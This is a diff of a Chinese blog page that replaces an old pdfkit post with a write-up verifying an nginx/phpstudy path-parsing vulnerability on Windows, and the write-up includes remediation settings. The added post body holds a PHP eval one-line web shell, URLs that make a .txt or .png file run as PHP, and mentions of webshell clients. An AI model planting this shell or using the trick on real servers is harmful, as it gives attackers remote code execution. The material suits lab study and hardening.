@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pdf,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -79,18 +79,17 @@
 
 
 
-<meta name="description" content="人生苦短我用python">
-<meta name="keywords" content="pdf">
+<meta name="description" content="一、环境搭建去官网下载phpstudy版本8.1.0.7，安装过程中不能使用中文作为目录，然后安装nginx与php，运行网站。 二、验证漏洞上传文件 info.txt到www目录，保证能够解析123&amp;lt;?php @eval($_GET[&amp;quot;pass&amp;quot;]);?&amp;gt; 访问127.0.0.1/info.txt看到文件存在访问127.0.0.1/info.txt/.php?pa">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pdfkit网页转pdf">
-<meta property="og:url" content="https://bjj.dropsec.xyz/2020/02/20/pdfkit网页转pdf/index.html">
+<meta property="og:title" content="AJay13">
+<meta property="og:url" content="https://bjj.dropsec.xyz/2020/10/19/phpstudy_nginx解析漏洞验证/index.html">
 <meta property="og:site_name" content="AJay13">
-<meta property="og:description" content="人生苦短我用python">
+<meta property="og:description" content="一、环境搭建去官网下载phpstudy版本8.1.0.7，安装过程中不能使用中文作为目录，然后安装nginx与php，运行网站。 二、验证漏洞上传文件 info.txt到www目录，保证能够解析123&amp;lt;?php @eval($_GET[&amp;quot;pass&amp;quot;]);?&amp;gt; 访问127.0.0.1/info.txt看到文件存在访问127.0.0.1/info.txt/.php?pa">
 <meta property="og:locale" content="/themes/next/languages/zh-Hans.yml">
-<meta property="og:updated_time" content="2020-02-25T15:12:09.374Z">
+<meta property="og:updated_time" content="2020-10-19T10:04:03.181Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pdfkit网页转pdf">
-<meta name="twitter:description" content="人生苦短我用python">
+<meta name="twitter:title" content="AJay13">
+<meta name="twitter:description" content="一、环境搭建去官网下载phpstudy版本8.1.0.7，安装过程中不能使用中文作为目录，然后安装nginx与php，运行网站。 二、验证漏洞上传文件 info.txt到www目录，保证能够解析123&amp;lt;?php @eval($_GET[&amp;quot;pass&amp;quot;]);?&amp;gt; 访问127.0.0.1/info.txt看到文件存在访问127.0.0.1/info.txt/.php?pa">
 
 
 
@@ -120,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="https://bjj.dropsec.xyz/2020/02/20/pdfkit网页转pdf/">
+  <link rel="canonical" href="https://bjj.dropsec.xyz/2020/10/19/phpstudy_nginx解析漏洞验证/">
 
 
 
 
 
-  <title>pdfkit网页转pdf | AJay13</title>
+  <title> | AJay13</title>
   
 
 
@@ -315,7 +314,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://bjj.dropsec.xyz/2020/02/20/pdfkit网页转pdf/">
+    <link itemprop="mainEntityOfPage" href="https://bjj.dropsec.xyz/2020/10/19/phpstudy_nginx解析漏洞验证/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="朴阿杰">
@@ -332,7 +331,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">pdfkit网页转pdf</h2>
+          <h2 class="post-title" itemprop="name headline"></h2>
         
 
         <div class="post-meta">
@@ -344,8 +343,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-20T18:56:28+08:00">
-                2020-02-20
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-10-19T18:04:03+08:00">
+                2020-10-19
               </time>
             
 
@@ -354,28 +353,6 @@
             
           </span>
 
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/python/" itemprop="url" rel="index">
-                    <span itemprop="name">python</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -398,7 +375,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  7
+                  503
                 </span>
               
 
@@ -414,7 +391,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  1
+                  2
                 </span>
               
             </div>
@@ -435,7 +412,17 @@
       
 
       
-        <p>人生苦短我用python<br><a id="more"></a></p>
+        <h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><p>去官网下载phpstudy版本8.1.0.7，安装过程中不能使用中文作为目录，然后安装nginx与php，运行网站。</p>
+<h2 id="二、验证漏洞"><a href="#二、验证漏洞" class="headerlink" title="二、验证漏洞"></a>二、验证漏洞</h2><p>上传文件 info.txt到www目录，保证能够解析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@eval($_GET[&quot;pass&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>访问127.0.0.1/info.txt看到文件存在<br>访问127.0.0.1/info.txt/.php?pass=phpinfo(); 看到info信息<br>访问127.0.0.1/info.txt/.php 连接菜刀<br>或上传冰蝎码.<br>访问127.0.0.1/shell.png/.php?pass=phpinfo();</p>
+<h2 id="三、原理分析"><a href="#三、原理分析" class="headerlink" title="三、原理分析"></a>三、原理分析</h2><p>这个漏洞是nginx的配置，windows存在这个问题，linux不存在这个问题</p>
+<p>1.由于nginx.conf的如下配置导致nginx把以’.php’结尾的文件交给fastcgi处理,为此可以构造<a href="http://ip/uploadfiles/test.png/.php" target="_blank" rel="noopener">http://ip/uploadfiles/test.png/.php</a> (url结尾不一定是’.php’,任何服务器端不存在的php文件均可,比如’a.php’),其中test.png是我们上传的包含PHP代码的照片文件。</p>
+<p>2、但是fastcgi在处理’.php’文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo=1 发挥作用,这项配置用于修复路径,如果当前路径不存在则采用上层路径。为此这里交由fastcgi处理的文件就变成了’/test.png’。</p>
+<p>3、最重要的一点是php-fpm.conf中的security.limit_extensions配置项限制了fastcgi解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许fastcgi将’.png’等文件当做代码解析。<br>在nginx默认配置中，有一个解析php的路由</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#location ~ \.php$ &#123;</span><br><span class="line"> #       include snippets/fastcgi-php.conf;</span><br><span class="line"> #</span><br><span class="line"> #       # With php7.0-cgi alone:</span><br><span class="line"> #       fastcgi_pass 127.0.0.1:9000;</span><br><span class="line"> #       # With php7.0-fpm:</span><br><span class="line"> #       fastcgi_pass unix:/run/php/php7.0-fpm.sock;</span><br><span class="line"> #&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="四、修复"><a href="#四、修复" class="headerlink" title="四、修复"></a>四、修复</h2><p>1、将php.ini文件中的cgi.fix_pathinfo的值设置为0,这样php再解析1.php/1.jpg这样的目录时,只要1.jpg不存在就会显示404页面</p>
+<p>2、php-fpm.conf中的security.limit_extensions后面的值设置为.php</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://wechat.doonsec.com/article/?id=1632d9b3b7f94ead41c575e12b1a3aff" target="_blank" rel="noopener">http://wechat.doonsec.com/article/?id=1632d9b3b7f94ead41c575e12b1a3aff</a></p>
 
       
     </div>
@@ -451,12 +438,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/pdf/" rel="tag" class=" fa  fa-tag  "> pdf</a>
-          
-        </div>
-      
 
       
       
@@ -466,8 +447,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/01/27/2019年安全公众号年度总结/" rel="next" title="2019年安全圈公众号年度总结">
-                <i class="fa fa-chevron-left"></i> 2019年安全圈公众号年度总结
+              <a href="/2020/10/19/md/" rel="next" title>
+                <i class="fa fa-chevron-left"></i> 
               </a>
             
           </div>
@@ -476,8 +457,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/02/25/微博评论转发采集/" rel="prev" title="微博评论转发采集">
-                微博评论转发采集 <i class="fa fa-chevron-right"></i>
+              <a href="/2020/10/19/ubuntu安装pcapy/" rel="prev" title>
+                 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -530,8 +511,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -546,7 +536,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">100</span>
+                  <span class="site-state-item-count">109</span>
                   <span class="site-state-item-name">文章</span>
                 </a>
               </div>
@@ -568,7 +558,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">63</span>
+                  <span class="site-state-item-count">60</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -586,7 +576,7 @@
      <span class="site-state-item-name">访客量</span>
 </div>
 <div class="site-state-item site-state-posts">
-      <span class="site-state-item-count">98.6k</span>
+      <span class="site-state-item-count">104.7k</span>
       <span class="site-state-item-name">总字数</span>
 </div>
           
@@ -685,6 +675,22 @@
       </section>
 
       
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、环境搭建"><span class="nav-number">1.</span> <span class="nav-text">一、环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、验证漏洞"><span class="nav-number">2.</span> <span class="nav-text">二、验证漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、原理分析"><span class="nav-number">3.</span> <span class="nav-text">三、原理分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、修复"><span class="nav-number">4.</span> <span class="nav-text">四、修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
 
       
 
@@ -712,7 +718,7 @@
     
       <span class="post-meta-item-text">博客总字数</span>
     
-    <span title="Site words total count">98.6k</span>
+    <span title="Site words total count">104.7k</span>
   
   <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1278048714'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1278048714%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
 </div>
